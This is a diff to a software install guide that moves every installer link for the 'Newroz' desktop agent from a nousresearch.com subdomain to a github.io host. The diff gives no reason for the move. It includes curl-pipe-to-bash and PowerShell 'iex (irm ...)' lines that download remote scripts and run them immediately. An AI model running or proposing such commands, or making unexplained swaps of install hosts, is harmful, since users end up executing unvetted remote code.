@@ -20,7 +20,7 @@ The simplest path: a one-click installer with a guided, point-and-click setup. N
 
 ### 1. Download and install
 
-[Download the Newroz Desktop installer](https://newroz-agent.nousresearch.com/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
+[Download the Newroz Desktop installer](https://newroz-agent.github.io/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
 
 ### 2. Connect Nous Portal
 
@@ -49,16 +49,16 @@ Prefer the terminal?
 On macOS/Linux/WSL2/Android, run
 
 ```bash
-curl -fsSL https://newroz-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://newroz-agent.github.io/install.sh | bash
 ```
 
 On Windows, run
 
 ```powershell
-iex (irm https://newroz-agent.nousresearch.com/install.ps1)
+iex (irm https://newroz-agent.github.io/install.ps1)
 ```
 
-Prefer to review first? Download [`install.sh`](https://newroz-agent.nousresearch.com/install.sh), inspect it, then run it.
+Prefer to review first? Download [`install.sh`](https://newroz-agent.github.io/install.sh), inspect it, then run it.
 
 After it finishes, reload your shell:
 
